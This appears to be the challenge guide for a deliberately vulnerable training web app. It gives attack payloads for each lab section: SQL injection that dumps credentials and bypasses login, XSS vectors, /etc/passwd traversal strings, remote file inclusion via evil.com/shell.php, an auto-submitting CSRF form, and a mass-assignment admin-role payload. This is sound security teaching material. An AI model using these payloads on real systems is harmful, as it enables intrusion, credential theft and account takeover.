# Bug Bounty Lab - Challenge Guide

This document provides detailed information about each vulnerability type and specific challenges in the lab.

## 🎯 Overview

The Bug Bounty Lab contains multiple vulnerability types commonly found in web applications. Each challenge is designed to teach specific attack techniques and their impact.

## 📚 Challenge Categories

### 1. SQL Injection Lab

**Location:** `/sql-injection`

#### Challenges:

##### Basic Search (`/sql-injection/search`)
- **Vulnerability:** String concatenation in SQL queries
- **Technique:** Direct injection via search parameters
- **Payloads:**
  ```
  ' OR '1'='1
  ' OR 1=1 --
  ' UNION SELECT 1,2,3,4 --
  ' AND (SELECT COUNT(*) FROM users) > 0 --
  ```

##### Union-based (`/sql-injection/union`)
- **Vulnerability:** Union-based SQL injection
- **Technique:** Extract data from multiple tables
- **Payloads:**
  ```
  1 UNION SELECT 1,2,3,4 --
  1 UNION SELECT username,password,3,4 FROM users --
  1 UNION SELECT name,sql,3,4 FROM sqlite_master --
  ```

##### Boolean-based Blind (`/sql-injection/boolean`)
- **Vulnerability:** Boolean-based blind SQL injection
- **Technique:** Use boolean conditions to extract data
- **Payloads:**
  ```
  admin' AND (SELECT COUNT(*) FROM users) > 0 --
  admin' AND (SELECT LENGTH(username) FROM users WHERE id=1) > 5 --
  admin' AND (SELECT SUBSTR(username,1,1) FROM users WHERE id=1) = 'a' --
  ```

##### Time-based Blind (`/sql-injection/time`)
- **Vulnerability:** Time-based blind SQL injection
- **Technique:** Use time delays to extract data
- **Payloads:**
  ```
  1 AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5) --
  1 AND (SELECT LENGTH(username) FROM users WHERE id=1) > 5 AND SLEEP(5) --
  ```

##### Error-based (`/sql-injection/error`)
- **Vulnerability:** Error-based SQL injection
- **Technique:** Extract information from error messages
- **Payloads:**
  ```
  1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
  1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
  ```

### 2. Cross-Site Scripting (XSS) Lab

**Location:** `/xss`

#### Challenges:

##### Reflected XSS (`/xss/reflected`)
- **Vulnerability:** Reflected XSS via URL parameters
- **Technique:** Inject scripts that are reflected from the server
- **Payloads:**
  ```
  <script>alert('XSS')</script>
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>
  javascript:alert('XSS')
  ```

##### Stored XSS (`/xss/stored`)
- **Vulnerability:** Stored XSS in comments
- **Technique:** Inject scripts that are stored and executed for all users
- **Payloads:**
  ```
  <script>alert('Stored XSS')</script>
  <img src=x onerror=alert('Stored XSS')>
  <iframe src="javascript:alert('Stored XSS')"></iframe>
  ```

##### DOM-based XSS (`/xss/dom`)
- **Vulnerability:** DOM-based XSS
- **Technique:** Client-side script injection
- **Payloads:**
  ```
  <script>alert('DOM XSS')</script>
  <img src=x onerror=alert('DOM XSS')>
  ```

##### Filter Bypass (`/xss/filter-bypass`)
- **Vulnerability:** XSS filter bypass
- **Technique:** Bypass basic filters using encoding and obfuscation
- **Payloads:**
  ```
  <ScRiPt>alert('XSS')</ScRiPt>
  <img src=x onerror=alert('XSS')>
  <iframe src="javascript:alert('XSS')"></iframe>
  %3Cscript%3Ealert('XSS')%3C/script%3E
  ```

### 3. Authentication Bypass Lab

**Location:** `/auth`

#### Challenges:

##### SQL Injection in Login (`/auth/login`)
- **Vulnerability:** SQL injection in authentication
- **Technique:** Bypass authentication using SQL injection
- **Payloads:**
  ```
  Username: admin' --
  Password: anything
  
  Username: ' OR '1'='1
  Password: ' OR '1'='1
  
  Username: admin' UNION SELECT 1,'admin','admin@test.com','admin' --
  Password: anything
  ```

##### Password Reset (`/auth/reset-password`)
- **Vulnerability:** SQL injection in password reset
- **Technique:** Extract user information via password reset
- **Payloads:**
  ```
  admin@test.com' UNION SELECT 1,username,password,4 FROM users --
  ' OR '1'='1
  ```

##### JWT Manipulation (`/auth/token`)
- **Vulnerability:** Weak JWT secret and algorithm confusion
- **Technique:** Manipulate JWT tokens
- **Steps:**
  1. Generate a token with weak secret
  2. Try algorithm confusion attacks
  3. Brute force the secret key

### 4. File Upload Lab

**Location:** `/file-upload`

#### Challenges:

##### Basic Upload (`/file-upload/basic`)
- **Vulnerability:** Unrestricted file upload
- **Technique:** Upload malicious files
- **Test Files:**
  - PHP webshells
  - JavaScript files
  - Executable files

##### File Type Bypass (`/file-upload/type-bypass`)
- **Vulnerability:** Weak file type validation
- **Technique:** Bypass file type restrictions
- **Methods:**
  - Change file extension
  - Modify MIME type
  - Use double extensions
  - Null byte injection

##### Path Traversal (`/file-upload/path-traversal`)
- **Vulnerability:** Path traversal in file upload
- **Technique:** Upload files outside intended directory
- **Payloads:**
  ```
  ../../../malicious.php
  ..\\..\\..\\malicious.php
  %2e%2e%2f%2e%2e%2f%2e%2e%2fmalicious.php
  ```

### 5. Cross-Site Request Forgery (CSRF) Lab

**Location:** `/csrf`

#### Challenges:

##### Basic CSRF (`/csrf/basic`)
- **Vulnerability:** No CSRF protection
- **Technique:** Create malicious forms that perform actions on behalf of users
- **Example:**
  ```html
  <form action="http://localhost:3000/csrf/update-profile" method="POST">
    <input name="name" value="Hacked">
    <input name="email" value="hacked@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  ```

##### Token Bypass (`/csrf/token`)
- **Vulnerability:** Weak CSRF token implementation
- **Technique:** Bypass CSRF token validation
- **Methods:**
  - Predict token values
  - Reuse tokens
  - Extract tokens via XSS

##### SameSite Bypass (`/csrf/samesite`)
- **Vulnerability:** SameSite cookie bypass
- **Technique:** Bypass SameSite cookie protection
- **Methods:**
  - Subdomain attacks
  - Timing attacks
  - Protocol downgrade

### 6. Directory Traversal Lab

**Location:** `/directory-traversal`

#### Challenges:

##### Basic Traversal (`/directory-traversal/basic`)
- **Vulnerability:** Path traversal in file serving
- **Technique:** Access files outside intended directory
- **Payloads:**
  ```
  ../../../etc/passwd
  ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
  ```

##### Local File Inclusion (`/directory-traversal/lfi`)
- **Vulnerability:** Local file inclusion
- **Technique:** Include local files in application
- **Payloads:**
  ```
  ../../../etc/passwd
  ../../../windows/system32/drivers/etc/hosts
  php://filter/read=convert.base64-encode/resource=../../../etc/passwd
  ```

##### Remote File Inclusion (`/directory-traversal/rfi`)
- **Vulnerability:** Remote file inclusion
- **Technique:** Include remote files in application
- **Payloads:**
  ```
  http://evil.com/shell.php
  https://evil.com/shell.php
  ftp://evil.com/shell.php
  ```

### 7. API Security Lab

**Location:** `/api`

#### Challenges:

##### Insecure Direct Object Reference (`/api/idor`)
- **Vulnerability:** IDOR in user profile access
- **Technique:** Access other users' data by changing IDs
- **Example:**
  ```
  GET /api/user/1
  GET /api/user/2
  GET /api/user/999
  ```

##### Mass Assignment (`/api/mass-assignment`)
- **Vulnerability:** Mass assignment in user updates
- **Technique:** Update fields not intended to be user-editable
- **Payload:**
  ```json
  {
    "username": "newuser",
    "email": "new@email.com",
    "role": "admin",
    "id": 1
  }
  ```

##### Rate Limiting Bypass (`/api/rate-limit`)
- **Vulnerability:** Weak rate limiting implementation
- **Technique:** Bypass rate limits
- **Methods:**
  - Change IP address
  - Use different user agents
  - Exploit timing windows

##### API Key Bypass (`/api/api-key`)
- **Vulnerability:** Weak API key validation
- **Technique:** Bypass API key authentication
- **Methods:**
  - Brute force API keys
  - Exploit key generation weaknesses
  - Use default/weak keys

##### JWT Manipulation (`/api/jwt`)
- **Vulnerability:** Weak JWT implementation
- **Technique:** Manipulate JWT tokens
- **Methods:**
  - Algorithm confusion
  - Secret key brute force
  - Token replay attacks

##### CORS Misconfiguration (`/api/cors`)
- **Vulnerability:** Overly permissive CORS
- **Technique:** Exploit CORS misconfiguration
- **Methods:**
  - Cross-origin requests
  - Credential theft
  - Data exfiltration

## 🛠️ Tools and Techniques

### Browser Developer Tools
- **Network Tab:** Inspect HTTP requests and responses
- **Console:** Execute JavaScript and view errors
- **Elements Tab:** Inspect and modify HTML/CSS
- **Application Tab:** View cookies, local storage, and session storage

### Recommended Tools
- **Burp Suite:** Web application security testing
- **OWASP ZAP:** Free web application security scanner
- **SQLMap:** Automated SQL injection tool
- **XSSer:** Cross-site scripting testing tool
- **Postman:** API testing and development

### Payload Resources
- **PayloadsAllTheThings:** Comprehensive payload collection
- **OWASP Testing Guide:** Official testing methodology
- **PortSwigger Web Security Academy:** Free online training

## 📝 Reporting Vulnerabilities

### Bug Report Template
```
Title: [Vulnerability Type] in [Component/Feature]

Description:
[Detailed description of the vulnerability]

Steps to Reproduce:
1. [Step 1]
2. [Step 2]
3. [Step 3]

Expected Behavior:
[What should happen]

Actual Behavior:
[What actually happens]

Impact:
[Potential impact of the vulnerability]

Proof of Concept:
[Code, screenshots, or other evidence]

Remediation:
[Suggested fix]
```

## ⚠️ Important Notes

1. **Educational Purpose Only:** This lab is designed for learning and should never be used against systems you don't own.

2. **Real-world Application:** The techniques learned here can be applied to legitimate bug bounty programs and penetration testing.

3. **Responsible Disclosure:** When testing real applications, always follow responsible disclosure practices.

4. **Legal Compliance:** Ensure you have proper authorization before testing any system.

5. **Stay Updated:** Security vulnerabilities and attack techniques evolve constantly. Keep learning and stay updated.

## 🎓 Learning Path

1. **Start with Basics:** Begin with SQL injection and XSS challenges
2. **Progress to Advanced:** Move to authentication bypass and file upload
3. **Master API Security:** Focus on API-specific vulnerabilities
4. **Practice Reporting:** Document your findings professionally
5. **Real-world Practice:** Apply skills to legitimate bug bounty programs

Happy Hunting! 🎯
